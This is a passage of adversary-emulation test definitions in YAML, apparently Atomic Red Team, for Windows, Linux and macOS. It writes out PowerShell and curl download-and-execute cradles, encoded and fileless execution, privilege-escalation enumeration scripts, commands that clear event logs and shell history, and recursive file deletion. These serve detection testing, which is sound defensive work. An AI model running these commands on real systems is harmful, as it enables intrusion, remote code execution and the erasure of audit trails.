      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
    name: command_prompt
- name: Powershell MsXml COM object - with prompt
  auto_generated_guid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
  description: |
    Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.

    Provided by https://github.com/mgreen27/mgreen27.github.io
  supported_platforms:
  - windows
  input_arguments:
    url:
      description: url of payload to execute
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
  executor:
    command: |
      powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
    name: command_prompt
- name: Powershell XML requests
  auto_generated_guid: 4396927f-e503-427b-b023-31049b9b09a6
  description: |
    Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.

    Provided by https://github.com/mgreen27/mgreen27.github.io
  supported_platforms:
  - windows
  input_arguments:
    url:
      description: url of payload to execute
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
  executor:
    command: |
      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
    name: command_prompt
- name: Powershell invoke mshta.exe download
  auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
  description: |
    Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".

    Provided by https://github.com/mgreen27/mgreen27.github.io
  supported_platforms:
  - windows
  input_arguments:
    url:
      description: url of payload to execute
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
  executor:
    command: |
      C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
    name: command_prompt
- name: Powershell Invoke-DownloadCradle
  auto_generated_guid: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7
  description: |
    Provided by https://github.com/mgreen27/mgreen27.github.io
    Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
  supported_platforms:
  - windows
  executor:
    steps: |
      1. Open Powershell_ise as a Privileged Account
      2. Invoke-DownloadCradle.ps1
    name: manual
- name: PowerShell Fileless Script Execution
  auto_generated_guid: fa050f5e-bc75-4230-af73-b6fd7852cd73
  description: |
    Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
    art-marker.txt is in the folder.
  supported_platforms:
  - windows
  executor:
    command: |
      # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
      iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
    cleanup_command: |
      Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
      Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: PowerShell Downgrade Attack
  auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
  description: |
    This test requires the manual installation of PowerShell V2.

    Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
  supported_platforms:
  - windows
  dependencies:
  - description: |
      PowerShell version 2 must be installed
    prereq_command: |
      if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually
  executor:
    command: |
      powershell.exe -version 2 -Command Write-Host $PSVersion
    name: powershell
- name: NTFS Alternate Data Stream Access
  auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
  description: |
    Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.
  supported_platforms:
  - windows
  input_arguments:
    ads_file:
      description: File created to store Alternate Stream Data
      type: String
      default: $env:TEMP\NTFS_ADS.txt
  dependencies:
  - description: |
      Homedrive must be an NTFS drive
    prereq_command: |
      if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains "NTFS") {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host Prereq's for this test cannot be met automatically
  executor:
    name: powershell
    command: |
      Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
      $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
      Invoke-Expression $streamcommand
    cleanup_command: |
      Remove-Item #{ads_file} -Force -ErrorAction Ignore

- name: PowerShell Session Creation and Use
  auto_generated_guid: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
  description: |
    Connect to a remote powershell session and interact with the host.
    Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
  
  supported_platforms:
    - windows

  input_arguments:
    hostname_to_connect:
      description: The host to connect to, by default it will connect to the local machine
      type: String
      default: $env:COMPUTERNAME

  dependencies:
  - description: |
       PSRemoting must be enabled
    prereq_command: |
      Try {
          New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
          exit 0
      } 
      Catch {
          exit 1
      }
    get_prereq_command: |
      Enable-PSRemoting

  executor:
    name: powershell
    elevation_required: true
    command: |
      New-PSSession -ComputerName #{hostname_to_connect}
      Test-Connection $env:COMPUTERNAME
      Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
      Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
      Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use

- name: ATHPowerShellCommandLineParameter -Command parameter variations
  auto_generated_guid: 686a9785-f99b-41d4-90df-66ed515f81d7
  description: Executes powershell.exe with variations of the -Command parameter
  supported_platforms:
  - windows
  input_arguments:
    command_line_switch_type:
      description: The type of supported command-line switch to use
      type: String
      default: Hyphen
    command_param_variation:
      description: The "Command" parameter variation to use
      type: String
      default: C
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop'
    name: powershell

- name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
  auto_generated_guid: 1c0a870f-dc74-49cf-9afc-eccc45e58790
  description: Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied
  supported_platforms:
  - windows
  input_arguments:
    command_line_switch_type:
      description: The type of supported command-line switch to use
      type: String
      default: Hyphen
    command_param_variation:
      description: The "Command" parameter variation to use
      type: String
      default: C
    encoded_arguments_param_variation:
      description: The "EncodedArguments" parameter variation to use
      type: String
      default: EA
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
    name: powershell

- name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
  auto_generated_guid: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3
  description: Executes powershell.exe with variations of the -EncodedCommand parameter
  supported_platforms:
  - windows
  input_arguments:
    command_line_switch_type:
      description: The type of supported command-line switch to use
      type: String
      default: Hyphen
    encoded_command_param_variation:
      description: The "EncodedCommand" parameter variation to use
      type: String
      default: E
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop'
    name: powershell

- name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
  auto_generated_guid: 0d181431-ddf3-4826-8055-2dbf63ae848b
  description: Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied
  supported_platforms:
  - windows
  input_arguments:
    encoded_command_param_variation:
      description: The "EncodedCommand" parameter variation to use
      type: String
      default: E
    command_line_switch_type:
      description: The type of supported command-line switch to use
      type: String
      default: Hyphen
    encoded_arguments_param_variation:
      description: The "EncodedArguments" parameter variation to use
      type: String
      default: EncodedArguments
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
    name: powershell

- name: PowerShell Command Execution
  auto_generated_guid: a538de64-1c74-46ed-aa60-b995ed302598
  description: |
    Use of obfuscated PowerShell to execute an arbitrary command; outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.
  supported_platforms:
  - windows
  input_arguments:
    obfuscated_code:
      description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
      type: String
      default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
  executor:
    command: |
      powershell.exe -e  #{obfuscated_code}
    name: command_prompt

- name: PowerShell Invoke Known Malicious Cmdlets
  auto_generated_guid: 49eb9404-5e0f-4031-a179-b40f7be385e3
  description: Powershell execution of known Malicious PowerShell Cmdlets
  supported_platforms:
  - windows
  input_arguments:
    Malicious_cmdlets:
      description: Known Malicious Cmdlets 
      type: String
      default: |
        "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"
  executor:
    name: powershell
    elevation_required: true
    command: |
      $malcmdlets = #{Malicious_cmdlets}
      foreach ($cmdlets in $malcmdlets) {
          "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
      foreach ($cmdlets in $malcmdlets) {
          $cmdlets}

- name: PowerUp Invoke-AllChecks
  auto_generated_guid: 1289f78d-22d2-4590-ac76-166737e1811b
  description: |
    Check for privilege escalation paths using PowerUp from PowerShellMafia
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
      Invoke-AllChecks
    name: powershell



- name: Create and Execute Batch Script
  auto_generated_guid: 9e8894c0-50bd-4525-a96c-d4ac78ece388
  description: |
    Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.
  supported_platforms:
  - windows
  input_arguments:
    command_to_execute:
      description: Command to execute within script.
      type: String
      default: dir
    script_path:
      description: Script path.
      type: Path
      default: $env:TEMP\T1059.003_script.bat
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Batch file must exist on disk at specified location (#{script_path})
    prereq_command: |
      if (Test-Path #{script_path}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item #{script_path} -Force | Out-Null
      Set-Content -Path #{script_path} -Value "#{command_to_execute}"
  executor:
    command: |
      Start-Process #{script_path}
    cleanup_command: |
      Remove-Item #{script_path} -Force -ErrorAction Ignore
    name: powershell
- name: Writes text to a file and displays it.
  auto_generated_guid: 127b4afe-2346-4192-815c-69042bec570e
  description: |
    Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.
  supported_platforms:
  - windows
  input_arguments:
    file_contents_path:
      description: Path to the file that the command prompt will drop.
      type: Path
      default: '%TEMP%\test.bin'
    message:
      description: Message that will be written to disk and then displayed.
      type: String
      default: 'Hello from the Windows Command Prompt!'
  executor:
    command: |
      echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
    cleanup_command: |
      del "#{file_contents_path}" >nul 2>&1
    name: command_prompt
- name: Suspicious Execution via Windows Command Shell
  auto_generated_guid: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
  description: |
    Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: File to output to
      type: String
      default: hello.txt
    input_message:
      description: Message to write to file
      type: String
      default: Hello, from CMD!
  executor:
    command: |
      %LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}
    name: command_prompt
- name: Simulate BlackByte Ransomware Print Bombing
  auto_generated_guid: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
  description: |
    This test attempts to open a file a specified number of times in Wordpad, then prints the contents. 
    It is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. 
    See https://redcanary.com/blog/blackbyte-ransomware/. 
  supported_platforms:
  - windows
  input_arguments:
    file_to_print:
      description: File to be opened/printed by Wordpad.
      type: String
      default: $env:temp\T1059_003note.txt
    max_to_print:
      description: The maximum number of Wordpad windows the test will open/print.
      type: String
      default: 75
  dependency_executor_name: powershell
  dependencies:
  - description: |
      File to print must exist on disk at specified location (#{file_to_print})
    prereq_command: |
      if (test-path "#{file_to_print}"){exit 0} else {exit 1}
    get_prereq_command: |
      new-item #{file_to_print} -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
  executor:
    command: |
      cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | out-null
    cleanup_command: |
      stop-process -name wordpad -force -erroraction silentlycontinue
    name: powershell
- name: Command Prompt read contents from CMD file and execute
  auto_generated_guid: df81db1b-066c-4802-9bc8-b6d030c3ba8e

  description: |
    Simulate Raspberry Robin using the "standard-in" command prompt feature cmd `/R <` to read and execute a file via cmd.exe
    See https://redcanary.com/blog/raspberry-robin/. 
  supported_platforms:
  - windows
  input_arguments:
    input_file:
      description: CMD file that is read by Command Prompt and execute, which launches calc.exe
      type: Path
      default: PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd
  dependency_executor_name: powershell
  dependencies:
  - description: |
      CMD file must exist on disk at specified location (#{input_file})
    prereq_command: |
      if (Test-Path #{input_file}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "#{input_file}"
  executor:
    command: |
      cmd /r cmd<#{input_file}
    name: command_prompt
    elevation_required: false
    
    
    
- name: Create and Execute Bash Shell Script
  auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
  description: |
    Creates and executes a simple bash script.
  supported_platforms:
  - macos
  - linux
  input_arguments:
    script_path:
      description: Script path
      type: Path
      default: /tmp/art.sh
  executor:
    command: |
      sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
      sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
      chmod +x #{script_path}
      sh #{script_path}
    cleanup_command: |
      rm #{script_path}
    name: sh
- name: Command-Line Interface
  auto_generated_guid: d0c88567-803d-4dca-99b4-7ce65e7b257c
  description: |
    Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

    Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
  supported_platforms:
  - macos
  - linux
  executor:
    command: |
      curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
      wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
    cleanup_command: |
      rm /tmp/art-fish.txt
    name: sh
- name: Harvest SUID executable files
  auto_generated_guid: 46274fc6-08a7-4956-861b-24cbbaa0503c
  description: |
    AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. 
  supported_platforms:
  - linux 
  input_arguments:
    autosuid:
      description: Path to the autosuid shell script
      type: Path
      default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
    autosuid_url:
      description: Path to download autosuid shell script
      type: Url
      default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh
  dependency_executor_name: bash
  dependencies:
  - description: |
      AutoSUID must exist on disk at specified location (#{autosuid})
    prereq_command: |
      if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      curl --create-dirs #{autosuid_url} --output #{autosuid}
  executor:
    command: |
      chmod +x #{autosuid}
      bash #{autosuid}
    cleanup_command: |
      rm -rf #{autosuid}
    name: sh
- name: LinEnum tool execution
  auto_generated_guid: a2b35a63-9df1-4806-9a4d-5fe0500845f2
  description: |
    LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.
  supported_platforms:
  - linux 
  input_arguments:
    linenum:
      description: Path to the LinEnum shell script
      type: Path
      default: PathToAtomicsFolder/T1059.004/src/LinEnum.sh
    linenum_url:
      description: Path to download LinEnum shell script
      type: Url
      default: https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh
  dependency_executor_name: bash
  dependencies:
  - description: |
      LinnEnum must exist on disk at specified location (#{linenum})
    prereq_command: |
      if [ -f #{linenum} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      curl --create-dirs #{linenum_url} --output #{linenum}
  executor:
    command: |
      chmod +x #{linenum}
      bash #{linenum}
    cleanup_command: |
      rm -rf #{linenum}
    name: sh



- name: Clear Logs
  auto_generated_guid: e6abb60e-26b8-41da-8aae-0c35174b0967
  description: |
    Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty.
  supported_platforms:
  - windows
  input_arguments:
    log_name:
      description: Windows Log Name, ex System
      type: String
      default: System
  executor:
    command: |
      wevtutil cl #{log_name}
    name: command_prompt
    elevation_required: true
- name: Delete System Logs Using Clear-EventLog
  auto_generated_guid: b13e9306-3351-4b4b-a6e8-477358b0b498
  description: |
    Clear event logs using built-in PowerShell commands.
    Upon successful execution, you should see the list of deleted event logs
    Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
  supported_platforms:
  - windows
  executor:
    command: |
      $logs = Get-EventLog -List | ForEach-Object {$_.Log}
      $logs | ForEach-Object {Clear-EventLog -LogName $_ }
      Get-EventLog -list
    name: powershell
    elevation_required: true
- name: Clear Event Logs via VBA
  auto_generated_guid: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
  description: |
    This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. 

    Elevation is required for this module to execute properly, otherwise WINWORD will throw an "Access Denied" error
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Microsoft Word must be installed
    prereq_command: |
      try {
        New-Object -COMObject "Word.Application" | Out-Null
        Stop-Process -Name "winword"
        exit 0
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft Word manually to meet this requirement"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
    name: powershell
    elevation_required: true



- name: Clear Bash history (rm)
  auto_generated_guid: a934276e-2be5-4a36-93fd-98adbb5bd4fc
  description: |
    Clears bash history via rm
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      rm ~/.bash_history
    name: sh
- name: Clear Bash history (echo)
  auto_generated_guid: cbf506a5-dd78-43e5-be7e-a46b7c7a0a11
  description: |
    Clears bash history via rm
  supported_platforms:
  - linux
  executor:
    command: |
      echo "" > ~/.bash_history
    name: sh
- name: Clear Bash history (cat dev/null)
  auto_generated_guid: b1251c35-dcd3-4ea1-86da-36d27b54f31f
  description: |
    Clears bash history via cat /dev/null
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      cat /dev/null > ~/.bash_history
    name: sh
- name: Clear Bash history (ln dev/null)
  auto_generated_guid: 23d348f3-cc5c-4ba9-bd0a-ae09069f0914
  description: |
    Clears bash history via a symlink to /dev/null
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      ln -sf /dev/null ~/.bash_history
    name: sh
- name: Clear Bash history (truncate)
  auto_generated_guid: 47966a1d-df4f-4078-af65-db6d9aa20739
  description: |
    Clears bash history via truncate
  supported_platforms:
  - linux
  executor:
    command: |
      truncate -s0 ~/.bash_history
    name: sh
- name: Clear history of a bunch of shells
  auto_generated_guid: 7e6721df-5f08-4370-9255-f06d8a77af4c
  description: |
    Clears the history of a bunch of different shell types by setting the history size to zero
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      unset HISTFILE
      export HISTFILESIZE=0
      history -c
    name: sh
- name:  Clear and Disable Bash History Logging
  auto_generated_guid: 784e4011-bd1a-4ecd-a63a-8feb278512e6
  description: |
    Clears the history and disable bash history logging of the current shell and future shell sessions
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      set +o history
      echo 'set +o history' >> ~/.bashrc
      . ~/.bashrc
      history -c
    cleanup_command: |
      sed -i 's/set +o history//g' ~/.bashrc
      . ~/.bashrc
      set -o history
    name: sh
- name:  Use Space Before Command to Avoid Logging to History
  auto_generated_guid: 53b03a54-4529-4992-852d-a00b4b7215a6
  description: |
    Using a space before a command causes the command to not be logged in the Bash History file
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
       hostname
       whoami
    name: sh

- name:  Disable Bash History Logging with SSH -T
  auto_generated_guid: 5f8abd62-f615-43c5-b6be-f780f25790a1
  description: |
    Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog
  supported_platforms:
  - linux
  dependencies:
  - description: |
      Install sshpass and create user account used for excuting
    prereq_command: |
      $(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)
    get_prereq_command: |
      /usr/sbin/useradd testuser1
      echo -e 'pwd101!\npwd101!' | passwd testuser1
      (which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)
  executor:
    command: |
      sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
    cleanup_command: |
      userdel -f testuser1
    name: sh

- name:  Prevent Powershell History Logging
  auto_generated_guid: 2f898b81-3e97-4abb-bc3f-a95138988370
  description: |
    Prevents Powershell history
  supported_platforms:
  - windows
  executor:
    command: |
       Set-PSReadlineOption –HistorySaveStyle SaveNothing
    name: powershell
    cleanup_command: 'Set-PSReadLineOption -HistorySaveStyle SaveIncrementally'
    
- name:  Clear Powershell History by Deleting History File
  auto_generated_guid: da75ae8d-26d6-4483-b0fe-700e4df4f037
  description: |
    Clears Powershell history
  supported_platforms:
  - windows
  executor:
    command: |
       Remove-Item (Get-PSReadlineOption).HistorySavePath
    name: powershell

- name:  Set Custom AddToHistoryHandler to Avoid History File Logging
  auto_generated_guid: 1d0d9aa6-6111-4f89-927b-53e8afae7f94
  description: |
    The "AddToHistoryHandler" receives the current command as the $line variable and then returns $true if 
    the line should be written to the history file. Here we simply return $false so nothing gets added to 
    the history file for the current session. 
  supported_platforms:
  - windows
  executor:
    command: |
      Set-PSReadLineOption -AddToHistoryHandler { return $false }
    cleanup_command: |
      Set-PSReadLineOption -AddToHistoryHandler $null
    name: powershell



- name: Delete a single file - Linux/macOS
  auto_generated_guid: 562d737f-2fc6-4b09-8c2a-7f8ff0828480
  description: |
    Delete a single file from the temporary directory
  supported_platforms:
  - linux
  - macos
  input_arguments:
    file_to_delete:
      description: Path of file to delete
      type: Path
      default: /tmp/victim-files/a
  executor:
    command: |
      rm -f #{file_to_delete}
    name: sh
- name: Delete an entire folder - Linux/macOS
  auto_generated_guid: a415f17e-ce8d-4ce2-a8b4-83b674e7017e
  description: |
    Recursively delete the temporary directory and all files contained within it
  supported_platforms:
  - linux
  - macos
  input_arguments:
    folder_to_delete:
      description: Path of folder to delete
      type: Path
      default: /tmp/victim-files
  executor:
    command: |
      rm -rf #{folder_to_delete}
    name: sh
- name: Overwrite and delete a file with shred
  auto_generated_guid: 039b4b10-2900-404b-b67f-4b6d49aa6499
  description: |
    Use the `shred` command to overwrite the temporary file and then delete it
  supported_platforms:
  - linux
  input_arguments:
    file_to_shred:
      description: Path of file to shred
      type: Path
      default: /tmp/victim-shred.txt
  executor:
    command: |
      shred -u #{file_to_shred}
    name: sh
- name: Delete a single file - Windows cmd
  auto_generated_guid: 861ea0b4-708a-4d17-848d-186c9c7f17e3
  description: |
    Delete a single file from the temporary directory using cmd.exe.
    Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
  supported_platforms:
  - windows
  input_arguments:
    file_to_delete:
      description: File to delete. Run the prereq command to create it if it does not exist.
      type: String
      default: '%temp%\deleteme_T1551.004'
  dependency_executor_name: command_prompt
  dependencies:
  - description: |
      The file to delete must exist on disk at specified location (#{file_to_delete})
    prereq_command: |
      IF EXIST "#{file_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
    get_prereq_command: |
      echo deleteme_T1551.004 >> #{file_to_delete}
  executor:
    command: |
      del /f #{file_to_delete}
    name: command_prompt
- name: Delete an entire folder - Windows cmd
  auto_generated_guid: ded937c4-2add-42f7-9c2c-c742b7a98698
  description: |
    Recursively delete a folder in the temporary directory using cmd.exe.
    Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
  supported_platforms:
  - windows
  input_arguments:
    folder_to_delete:
      description: Folder to delete. Run the prereq command to create it if it does not exist.
      type: String
      default: '%temp%\deleteme_T1551.004'
  dependency_executor_name: command_prompt
  dependencies:
  - description: |
      The file to delete must exist on disk at specified location (#{folder_to_delete})
    prereq_command: |
      IF EXIST "#{folder_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
    get_prereq_command: |
      mkdir #{folder_to_delete}
  executor:
    command: |
      rmdir /s /q #{folder_to_delete}
    name: command_prompt
- name: Delete a single file - Windows PowerShell
